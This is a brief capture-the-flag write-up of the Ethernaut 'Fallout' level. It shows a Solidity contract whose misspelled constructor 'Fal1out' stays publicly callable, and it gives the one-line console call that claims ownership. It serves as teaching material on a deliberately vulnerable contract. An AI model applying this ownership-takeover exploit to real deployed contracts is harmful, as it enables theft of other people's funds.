# Fallout

It said that [`remix`](https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.7+commit.e28d00a7.js) might help so I pasted the code in it.

While looking at the code we can see that a constructor is made but we can see its misspelled:

```js
contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

Now this sort of thing cannot exists now(they changed the way solidity now declares the constructors). Since the constructor is misspelled, we can call the function like any other public function.

## Solution

```js
contract.Fal1out({value: toWei("0.001", "ether"), from: player})
```